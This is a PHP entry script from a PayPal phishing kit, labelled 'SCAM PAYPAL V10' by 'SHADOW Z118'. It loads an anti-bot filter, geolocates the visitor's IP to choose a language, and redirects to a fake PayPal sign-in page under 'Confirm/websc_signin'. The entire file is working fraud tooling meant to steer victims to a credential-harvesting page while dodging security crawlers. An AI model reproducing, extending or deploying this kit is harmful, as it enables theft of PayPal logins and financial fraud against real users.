<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #    SCAM PAYPAL V10    #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "./antibots.php";

////////////////////////////////////////////////////////////////////////////////////////////////////

// GET Country & Country CODE !
                                           
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
    }

    $_SESSION['_countryname_'] = $countryname;
    $_SESSION['_countrycode_'] = $countrycode;
	
	//////////////////////////////////////////////////////////////////

  if ($_SESSION['_countrycode_'] == "FR" || $_SESSION['_countrycode_'] == "DZ" || $_SESSION['_countrycode_'] == "MA" || $_SESSION['_countrycode_'] == "TN" || $_SESSION['_countrycode_'] == "CD" || $_SESSION['_countrycode_'] == "MG" || $_SESSION['_countrycode_'] == "CM" || $_SESSION['_countrycode_'] == "CA" || $_SESSION['_countrycode_'] == "CI" || $_SESSION['_countrycode_'] == "BF" || $_SESSION['_countrycode_'] == "NE" || $_SESSION['_countrycode_'] == "SN" || $_SESSION['_countrycode_'] == "ML" || $_SESSION['_countrycode_'] == "RW" || $_SESSION['_countrycode_'] == "BE" || $_SESSION['_countrycode_'] == "GF" || $_SESSION['_countrycode_'] == "TD" || $_SESSION['_countrycode_'] == "HT" || $_SESSION['_countrycode_'] == "BI" || $_SESSION['_countrycode_'] == "BJ" || $_SESSION['_countrycode_'] == "CH" || $_SESSION['_countrycode_'] == "TG" || $_SESSION['_countrycode_'] == "CF" || $_SESSION['_countrycode_'] == "CG" || $_SESSION['_countrycode_'] == "GA" || $_SESSION['_countrycode_'] == "KM" || $_SESSION['_countrycode_'] == "GK" || $_SESSION['_countrycode_'] == "DJ" || $_SESSION['_countrycode_'] == "LU" || $_SESSION['_countrycode_'] == "VU" || $_SESSION['_countrycode_'] == "SC" || $_SESSION['_countrycode_'] == "MC") {
    $_SESSION['_language_'] = "fr";
} elseif ($_SESSION['_countrycode_'] == "MX" || $_SESSION['_countrycode_'] == "PH" || $_SESSION['_countrycode_'] == "ES" || $_SESSION['_countrycode_'] == "CO" || $_SESSION['_countrycode_'] == "AR" || $_SESSION['_countrycode_'] == "PE" || $_SESSION['_countrycode_'] == "VE" || $_SESSION['_countrycode_'] == "CL" || $_SESSION['_countrycode_'] == "EC" || $_SESSION['_countrycode_'] == "GT" || $_SESSION['_countrycode_'] == "CU" || $_SESSION['_countrycode_'] == "HN" || $_SESSION['_countrycode_'] == "PY" || $_SESSION['_countrycode_'] == "SV" || $_SESSION['_countrycode_'] == "NI" || $_SESSION['_countrycode_'] == "CR" || $_SESSION['_countrycode_'] == "UY") {
    $_SESSION['_language_'] = "es";
} elseif ($_SESSION['_countrycode_'] == "IT" || $_SESSION['_countrycode_'] == "SM") {
   $_SESSION['_language_'] = "it";
} elseif ($_SESSION['_countrycode_'] == "RU" || $_SESSION['_countrycode_'] == "BY" || $_SESSION['_countrycode_'] == "KZ" || $_SESSION['_countrycode_'] == "KG" || $_SESSION['_countrycode_'] == "TJ") {
    $_SESSION['_language_'] = "ru";
} elseif ($_SESSION['_countrycode_'] == "PT" || $_SESSION['_countrycode_'] == "BR" || $_SESSION['_countrycode_'] == "AO" || $_SESSION['_countrycode_'] == "MZ" || $_SESSION['_countrycode_'] == "MO") {
    $_SESSION['_language_'] = "pt";
} elseif ($_SESSION['_countrycode_'] == "TR" || $_SESSION['_countrycode_'] == "cy") {
    $_SESSION['_language_'] = "tr";
} elseif ($_SESSION['_countrycode_'] == "PL") {
    $_SESSION['_language_'] = "pl";
} elseif ($_SESSION['_countrycode_'] == "NO") {
    $_SESSION['_language_'] = "no";
} elseif ($_SESSION['_countrycode_'] == "NL" || $_SESSION['_countrycode_'] == "AW") {
    $_SESSION['_language_'] = "nl";
} elseif ($_SESSION['_countrycode_'] == "DE" || $_SESSION['_countrycode_'] == "CH") {
    $_SESSION['_language_'] = "de";
} else {
   $_SESSION['_language_'] = "en";
} $_SESSION['S-Z118'] = $_SESSION['_language_']."_".$_SESSION['_countrycode_'];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

header("LOCATION: Confirm/websc_signin/?country.x=".$_SESSION['_countrycode_']."&locale.x=".$_SESSION['S-Z118']."");
?>
